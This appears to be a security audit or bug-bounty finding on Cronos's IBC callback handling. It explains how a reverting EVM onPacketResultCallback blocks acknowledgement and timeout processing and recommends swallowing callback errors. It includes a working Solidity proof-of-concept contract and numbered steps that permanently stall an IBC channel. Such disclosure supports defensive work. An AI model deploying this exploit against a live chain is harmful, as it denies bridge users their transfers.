### Title
Malicious EVM Contract Can Permanently Block IBC Packet Processing via Reverted `onPacketResultCallback` - (File: x/cronos/keeper/keeper.go)

### Summary

`onPacketResult` in `x/cronos/keeper/keeper.go` calls an EVM contract's `onPacketResultCallback` and unconditionally propagates any revert or error back to the ibc-go callbacks middleware. Because the callbacks middleware propagates that error through `OnAcknowledgementPacket` / `OnTimeoutPacket`, the entire IBC packet-processing transaction reverts. The packet commitment is never deleted, permanently blocking that IBC channel sequence for any relayer.

### Finding Description

`onPacketResult` is the shared implementation for both `IBCOnAcknowledgementPacketCallback` and `IBCOnTimeoutPacketCallback`:

```go
func (k Keeper) onPacketResult(...) error {
    ...
    _, res, err := k.CallEVM(ctx, &senderAddr, data, big.NewInt(0), gasLimit)
    if err != nil {
        return err                                                          // ← propagated
    }
    if res.Failed() {
        return fmt.Errorf("IBC callback EVM execution reverted: %s", res.VmError) // ← propagated
    }
    return nil
}
``` [1](#0-0) 

Both `IBCOnAcknowledgementPacketCallback` and `IBCOnTimeoutPacketCallback` return this error directly to the ibc-go callbacks middleware: [2](#0-1) 

The callbacks middleware is wired in `app.go` with `math.MaxUint64` gas: [3](#0-2) 

A malicious actor deploys a contract whose `onPacketResultCallback` always reverts (e.g., `revert("grief")`). They then use the ICA precompile to submit IBC messages from that contract address. The ICA precompile records the contract address as `packetSenderAddress`. When the relayer submits `MsgAcknowledgement` or `MsgTimeout`, the callbacks middleware calls `IBCOnAcknowledgementPacketCallback` / `IBCOnTimeoutPacketCallback`, which calls `onPacketResult`, which calls the malicious contract, which reverts. The returned error causes the entire IBC message to revert. The packet commitment is never cleared.

Contrast this with the `IBCConversionModule` middleware, which explicitly swallows conversion errors on the refund path to avoid blocking IBC: [4](#0-3) 

No equivalent protection exists in `onPacketResult`.

### Impact Explanation

The IBC packet commitment for the targeted sequence is never deleted. No relayer can ever successfully submit `MsgAcknowledgement` or `MsgTimeout` for that packet. The IBC channel is permanently stuck at that sequence, preventing all subsequent ordered-channel packets from being processed. This is a permanent, unprivileged DoS on IBC bridge/conversion flows.

**Impact class:** High — Permanent or long-lived inability for honest users or validators to process valid IBC transfers or bridge flows under normal network assumptions.

### Likelihood Explanation

The attacker only needs to:
1. Deploy a contract with a reverting `onPacketResultCallback`.
2. Call the ICA precompile's `submitMsgs` from that contract to create one IBC packet.
3. Wait for the packet to time out or be acknowledged.

No privileged access, leaked keys, or cryptographic breaks are required. The ICA precompile is publicly accessible to any EVM contract.

### Recommendation

Isolate the EVM callback execution so that a revert does not propagate to the IBC layer. Two complementary approaches:

1. **Cached context with error swallowing:** Execute `CallEVM` inside a `ctx.CacheContext()` and, on error or `res.Failed()`, log the failure and return `nil` instead of the error — mirroring the pattern already used in `IBCConversionModule.OnAcknowledgementPacket`.

2. **Distinguish fatal vs. non-fatal errors:** Only propagate errors that indicate a broken chain invariant (e.g., codec failure); treat EVM-level reverts as non-fatal and log them.

### Proof of Concept

```solidity
// MaliciousCallback.sol
pragma solidity ^0.8.4;
contract MaliciousCallback {
    address constant icaContract = 0x0000000000000000000000000000000000000066;

    // Step 1: register ICA account and submit any IBC message
    function attack(string calldata connID, bytes calldata msgs, uint256 timeout) external {
        (bool ok,) = icaContract.call(
            abi.encodeWithSignature("submitMsgs(string,bytes,uint256)", connID, msgs, timeout)
        );
        require(ok);
    }

    // Step 2: when the packet times out or is acknowledged, this is called.
    // It always reverts, causing onPacketResult to return an error,
    // which propagates through IBCOnAcknowledgementPacketCallback /
    // IBCOnTimeoutPacketCallback and reverts the entire IBC message.
    function onPacketResultCallback(string calldata, uint64, bool) external payable returns (bool) {
        revert("grief");
    }
}
```

1. Deploy `MaliciousCallback`.
2. Call `attack(connID, anyValidMsg, shortTimeout)` — this submits an IBC packet with `packetSenderAddress = address(MaliciousCallback)`.
3. Let the packet time out (or be acknowledged with an error).
4. Observe that every relayer attempt to submit `MsgTimeout` / `MsgAcknowledgement` reverts with `"IBC callback EVM execution reverted: grief"`.
5. The packet commitment is never cleared; the IBC channel is permanently stuck.

### Citations

**File:** x/cronos/keeper/keeper.go (L427-435)
```go
	gasLimit := k.GetParams(ctx).MaxCallbackGas
	_, res, err := k.CallEVM(ctx, &senderAddr, data, big.NewInt(0), gasLimit)
	if err != nil {
		return err
	}
	if res.Failed() {
		return fmt.Errorf("IBC callback EVM execution reverted: %s", res.VmError)
	}
	return nil
```

**File:** x/cronos/keeper/keeper.go (L438-463)
```go
func (k Keeper) IBCOnAcknowledgementPacketCallback(
	ctx sdk.Context,
	packet channeltypes.Packet,
	acknowledgement []byte,
	relayer sdk.AccAddress,
	contractAddress,
	packetSenderAddress string,
	version string,
) error {
	var res channeltypes.Acknowledgement
	if err := k.cdc.UnmarshalJSON(acknowledgement, &res); err != nil {
		return err
	}
	return k.onPacketResult(ctx, packet, res.Success(), relayer, contractAddress, packetSenderAddress)
}

func (k Keeper) IBCOnTimeoutPacketCallback(
	ctx sdk.Context,
	packet channeltypes.Packet,
	relayer sdk.AccAddress,
	contractAddress,
	packetSenderAddress string,
	version string,
) error {
	return k.onPacketResult(ctx, packet, false, relayer, contractAddress, packetSenderAddress)
}
```

**File:** app/app.go (L861-866)
```go
	icaCallbacks := ibccallbacks.NewIBCMiddleware(app.CronosKeeper, math.MaxUint64)
	icaCallbacks.SetUnderlyingApplication(icaControllerStack)
	icaCallbacks.SetICS4Wrapper(app.IBCKeeper.ChannelKeeper)
	icaControllerStack = icaCallbacks
	// Since the callbacks middleware itself is an ics4wrapper, it needs to be passed to the ica controller keeper
	app.ICAControllerKeeper.WithICS4Wrapper(icaCallbacks)
```

**File:** x/cronos/middleware/conversion_middleware.go (L179-188)
```go
				); err != nil {
					// Intentional: log and continue so the IBC refund is not blocked.
					// Sender keeps the refunded IBC vouchers and can retry conversion manually.
					im.cronoskeeper.Logger(ctx).Error(
						"failed to convert refund vouchers on acknowledgement",
						"denom", denom,
						"sender", data.Sender,
						"error", err,
					)
				}
```
